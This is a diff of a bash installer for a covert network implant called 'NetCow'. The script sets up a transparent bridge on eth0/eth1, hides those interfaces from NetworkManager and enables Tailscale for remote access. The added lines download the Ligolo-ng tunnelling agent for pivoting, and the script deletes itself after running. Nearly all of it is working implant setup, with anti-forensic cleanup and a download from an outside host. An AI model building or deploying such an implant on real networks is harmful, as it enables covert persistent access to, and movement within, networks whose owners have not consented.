@@ -1,10 +1,11 @@
 #!/bin/bash
 
 set -e
-echo "[+] Deploying network implant..."
+
+echo "[+] Deploying NetCow implant..."
 
 # 1. Install required packages
-REQUIRED_PKGS=(bridge-utils ifupdown isc-dhcp-client tailscale)
+REQUIRED_PKGS=(bridge-utils ifupdown isc-dhcp-client tailscale curl tar)
 for pkg in "${REQUIRED_PKGS[@]}"; do
     if ! dpkg -s "$pkg" >/dev/null 2>&1; then
         echo "    [-] $pkg missing, installing..."
@@ -63,9 +64,9 @@ dhclient -1 br0
 EOF
 
 chmod +x /usr/local/sbin/setup_bridge.sh
-echo "[+] Script /usr/local/sbin/setup_bridge.sh created."
+echo "[+] setup_bridge.sh created."
 
-# 4. Create systemd service for bridge
+# 4. Create systemd service
 cat << 'EOF' > /etc/systemd/system/setup-bridge.service
 [Unit]
 Description=Setup bridge br0 at boot
@@ -83,9 +84,9 @@ EOF
 
 echo "[+] Systemd service setup-bridge.service created."
 
-# 5. Configure NetworkManager to ignore eth0/eth1
+# 5. NetworkManager config to ignore eth0/eth1
 NM_CONF="/etc/NetworkManager/NetworkManager.conf"
-echo "[+] Configuring NetworkManager to ignore eth0 and eth1..."
+echo "[+] Configuring NetworkManager to ignore eth0/eth1..."
 if ! grep -q "\[keyfile\]" "$NM_CONF"; then
     echo -e "\n[keyfile]" >> "$NM_CONF"
 fi
@@ -98,21 +99,29 @@ fi
 systemctl restart NetworkManager
 echo "[+] NetworkManager restarted."
 
-# 6. Enable bridge setup service
+# 6. Enable bridge service
 systemctl daemon-reexec
 systemctl enable setup-bridge.service
 echo "[+] setup-bridge.service enabled."
 
-# 7. Enable and start Tailscale service
-echo "[+] Enabling and starting Tailscale service..."
+# 7. Enable and start Tailscale
+echo "[+] Enabling and starting Tailscale..."
 systemctl enable tailscaled
 systemctl start tailscaled
-echo "[+] Tailscale daemon is active. You can now run 'sudo tailscale up --authkey tskey-auth-xxxxxxxxxxxxxxxx' or use an auth key."
+echo "[+] Tailscale daemon running."
 
-# 8. Self-delete this script
+# 8. Download and extract Ligolo-ng agent
+echo "[+] Downloading Ligolo-ng agent..."
+mkdir -p /opt/ligolo
+curl -sSL https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_arm64.tar.gz -o /opt/ligolo/ligolo-agent.tar.gz
+tar -xvzf /opt/ligolo/ligolo-agent.tar.gz -C /opt/ligolo/
+chmod +x /opt/ligolo/agent
+rm /opt/ligolo/ligolo-agent.tar.gz
+echo "[+] Ligolo-ng agent ready at /opt/ligolo/agent"
+
+# 9. Self-delete script
 INSTALLER_PATH=$(readlink -f "$0")
 echo "[+] Deleting installer script: $INSTALLER_PATH"
 rm -f "$INSTALLER_PATH"
 
-echo "[✓] Installation complete."
-echo "[!] ToDo 'sudo reboot'"
+echo "[✓] Installation complete. Reboot to activate the implant and run Tailscale or Ligolo."
